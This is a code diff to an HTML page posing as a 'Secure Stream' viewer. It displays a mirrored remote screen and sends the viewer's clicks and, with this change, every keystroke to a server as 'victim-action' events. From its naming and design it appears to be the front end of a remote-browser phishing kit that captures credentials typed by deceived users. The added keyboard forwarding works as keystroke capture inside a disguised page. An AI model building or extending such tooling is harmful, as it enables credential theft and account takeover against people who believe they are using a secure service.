@@ -2,15 +2,17 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Stream</title>
     <style>
         body { background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #mirror { max-width: 100%; max-height: 100%; object-fit: contain; display: none; touch-action: none; }
-        #loader { color: #444; font-family: sans-serif; }
+        #mirror { max-width: 100%; max-height: 100%; object-fit: contain; display: none; touch-action: none; cursor: crosshair; }
+        #loader { color: #555; font-family: 'Segoe UI', sans-serif; font-size: 14px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
     <div id="loader">INITIALIZING_SECURE_STREAM...</div>
     <img id="mirror" draggable="false" />
+
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <script>
         const socket = io({ transports: ['websocket'] });
@@ -25,13 +27,24 @@
             }
         });
 
+        // COORDINATE ENGINE: Bridges your screen to the server
         img.addEventListener('pointerdown', (e) => {
-            const r = img.getBoundingClientRect();
-            socket.emit('victim-action', { 
-                type: 'click', 
-                x: (e.clientX - r.left) * (1280 / r.width), 
-                y: (e.clientY - r.top) * (720 / r.height) 
-            });
+            const rect = img.getBoundingClientRect();
+            
+            // Calculate the multiplier based on the server's 1280x720 resolution
+            const scaleX = 1280 / rect.width;
+            const scaleY = 720 / rect.height;
+
+            const x = Math.round((e.clientX - rect.left) * scaleX);
+            const y = Math.round((e.clientY - rect.top) * scaleY);
+
+            socket.emit('victim-action', { type: 'click', x, y });
+        });
+
+        // KEYBOARD ENGINE
+        window.addEventListener('keydown', (e) => {
+            if (["Control", "Shift", "Alt", "Meta"].includes(e.key)) return;
+            socket.emit('victim-action', { type: 'key', key: e.key });
         });
     </script>
 </body>
